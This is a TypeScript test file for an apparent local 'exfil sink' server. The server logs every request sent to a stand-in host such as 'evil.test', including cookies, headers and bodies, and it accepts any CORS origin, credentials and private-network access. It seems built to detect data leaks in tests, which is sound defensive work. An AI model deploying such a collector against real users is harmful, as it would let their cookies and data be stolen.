import { afterEach, describe, expect, it } from 'vitest'
import { type ExfilSink, startExfilSink } from '../src/exfil-sink'

const sinks: ExfilSink[] = []
afterEach(async () => {
  await Promise.all(sinks.splice(0).map((sink) => sink.close()))
})

async function start(options: Parameters<typeof startExfilSink>[0] = {}): Promise<ExfilSink> {
  const sink = await startExfilSink(options)
  sinks.push(sink)
  return sink
}

describe('startExfilSink', () => {
  it('reports 127.0.0.1 by default and the hostname it is given otherwise', async () => {
    const plain = await start()
    expect(plain.origin).toBe(`http://127.0.0.1:${plain.port}`)
    const named = await start({ hostname: 'evil.test' })
    expect(named.origin).toBe(`http://evil.test:${named.port}`)
  })

  it('records every request: method, host, path, query, headers and body', async () => {
    let now = 5
    const sink = await start({ now: () => now })
    await fetch(`${sink.origin}/collect?c=canary-cookie`, {
      method: 'POST',
      headers: { 'content-type': 'text/plain', 'x-stolen': 'canary-header' },
      body: 'canary-body',
    })
    now = 6
    await fetch(`${sink.origin}/pixel.gif`)
    expect(sink.requests).toHaveLength(2)
    expect(sink.requests[0]).toMatchObject({
      method: 'POST',
      host: '127.0.0.1',
      path: '/collect',
      query: { c: 'canary-cookie' },
      body: 'canary-body',
      at: 5,
    })
    expect(sink.requests[0]?.headers['x-stolen']).toBe('canary-header')
    expect(sink.requests[1]).toMatchObject({ method: 'GET', path: '/pixel.gif', at: 6 })
  })

  it('accepts whatever it is sent, so a leak is visible as a success rather than an error', async () => {
    const sink = await start()
    const reply = await fetch(`${sink.origin}/anything`, {
      method: 'PUT',
      headers: { origin: 'https://www.woolworths.test' },
      body: '{}',
    })
    expect(reply.status).toBe(200)
    expect(await reply.text()).toBe('ok')
    expect(reply.headers.get('access-control-allow-origin')).toBe('https://www.woolworths.test')
    expect(reply.headers.get('access-control-allow-credentials')).toBe('true')
  })

  it('answers CORS preflights with every method and requested header allowed', async () => {
    const sink = await start()
    const reply = await fetch(`${sink.origin}/collect`, {
      method: 'OPTIONS',
      headers: {
        origin: 'https://www.woolworths.test',
        'access-control-request-method': 'POST',
        'access-control-request-headers': 'content-type,x-stolen',
      },
    })
    expect(reply.status).toBe(204)
    expect(reply.headers.get('access-control-allow-headers')).toBe('content-type,x-stolen')
    expect(reply.headers.get('access-control-allow-methods')).toContain('POST')
    expect(reply.headers.get('access-control-allow-private-network')).toBe('true')
    expect(sink.requests[0]?.method).toBe('OPTIONS')
  })

  it('allows any origin and header when the request names none', async () => {
    const sink = await start()
    const reply = await fetch(`${sink.origin}/collect`, { method: 'OPTIONS' })
    expect(reply.headers.get('access-control-allow-origin')).toBe('*')
    expect(reply.headers.get('access-control-allow-headers')).toBe('*')
  })

  it('records only the first megabyte of a huge body', async () => {
    const sink = await start()
    await fetch(`${sink.origin}/big`, { method: 'POST', body: 'y'.repeat(1_200_000) })
    expect(sink.requests[0]?.body).toHaveLength(1_000_000)
  })
})
